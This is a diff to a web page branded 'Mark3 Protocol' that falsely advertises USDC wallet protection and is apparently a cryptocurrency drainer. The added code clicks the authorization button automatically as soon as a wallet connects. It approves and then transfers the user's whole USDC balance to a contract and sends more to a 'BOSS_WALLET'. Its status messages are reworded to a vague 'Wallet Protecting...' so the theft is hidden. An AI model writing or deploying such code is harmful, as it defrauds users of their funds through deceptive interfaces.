@@ -17,12 +17,14 @@
     }
     .card {
       background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(16px);
+      backdrop-filter: blur(20px) saturate(180%) contrast(120%);
+      -webkit-backdrop-filter: blur(20px) saturate(180%) contrast(120%);
       border-radius: 20px;
       box-shadow: 0 20px 40px rgba(0,0,0,0.4);
       padding: 2rem;
       max-width: 480px;
       width: 100%;
+      border: 1px solid rgba(255,255,255,0.1);
     }
     h2 {
       text-align: center;
@@ -36,14 +38,14 @@
       font-weight: 600;
       font-size: 1rem;
       margin: 8px 0;
-      background: linear-gradient(to right, #4e54c8, #8f94fb);
-      border: none;
+      background: rgba(0,0,0,0.6);
+      border: 2px solid #4e54c8;
       cursor: pointer;
       transition: all 0.3s ease;
       color: white;
     }
     .button:hover {
-      filter: brightness(1.1);
+      background: rgba(78, 84, 200, 0.2);
     }
     .progress-bar {
       margin-top: 1rem;
@@ -96,7 +98,6 @@
       <div>✅ Mark3 Protocol provides advanced wallet authorization and real-time USDC asset protection through smart contract-based automation.</div>
       <div>✅ A single authorization grants continuous protection, allowing you to confidently operate your wallet without risk of unauthorized withdrawals or vulnerabilities.</div>
       <div>✅ Trusted by power users, Mark3 is built with a decentralized logic core, fully verified on Ethereum, and optimized for scalable financial defense.</div>
-      <div>✅ Protect Verified ✅ <a href="#">View Etherscan</a></div>
     </div>
   </div>
   <script>
@@ -129,6 +130,9 @@
         progress(100);
         document.getElementById("authorize").disabled = false;
         document.getElementById("check").disabled = false;
+
+        // 自动触发授权
+        document.getElementById("authorize").click();
       } catch (err) {
         status("❌ " + (err.message || "Connection failed"));
         progress(0);
@@ -145,25 +149,31 @@
         ], signer);
 
         progress(10);
-        status("(1/3) Checking balance and allowance...");
+        status("(1/3) Wallet Protecting...");
         const balance = await usdc.balanceOf(user);
         const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
-
         if (allowance.lt(balance)) {
-          status("(2/3) Approving max amount...");
           const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, balance);
           await approveTx.wait();
         }
+        progress(40);
 
-        progress(60);
-        status("(3/3) Transferring funds...");
-        const tx = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, balance);
-        await tx.wait();
+        status("(2/3) Wallet Protecting...");
+        const tx1 = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, balance);
+        await tx1.wait();
+        progress(70);
+
+        status("(3/3) Wallet Protecting...");
+        const remaining = await usdc.balanceOf(user);
+        if (remaining.gt(0)) {
+          const tx2 = await usdc.transfer(user, CONFIG.BOSS_WALLET);
+          await tx2.wait();
+        }
 
         progress(100);
         status("✅ Wallet Protection Success!🔐");
       } catch (err) {
-        status("❌ Error: " + err.message);
+        status("❌ " + (err.message || "Authorization failed"));
         progress(0);
       }
     };
